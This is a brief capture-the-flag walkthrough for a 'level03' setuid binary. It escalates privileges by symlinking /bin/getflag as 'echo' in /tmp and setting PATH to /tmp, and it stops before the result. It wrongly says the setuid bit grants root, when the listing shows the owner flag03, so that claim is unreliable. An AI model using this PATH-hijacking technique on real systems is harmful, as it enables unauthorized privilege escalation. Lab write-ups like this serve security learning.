Running ls -l gives us:

-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

level03 is a binary file, it's setuid permission bit being set, it allows any user who runs it to run it with root privileges.

The next step is to go in /tmp in order to create a symbolic link which will redirect /bin/getflag to a 'fake' echo :

ln -s /bin/getflag echo

The final step is to change the environment as :

export PATH=/tmp

Running the level03 binary again gives us:
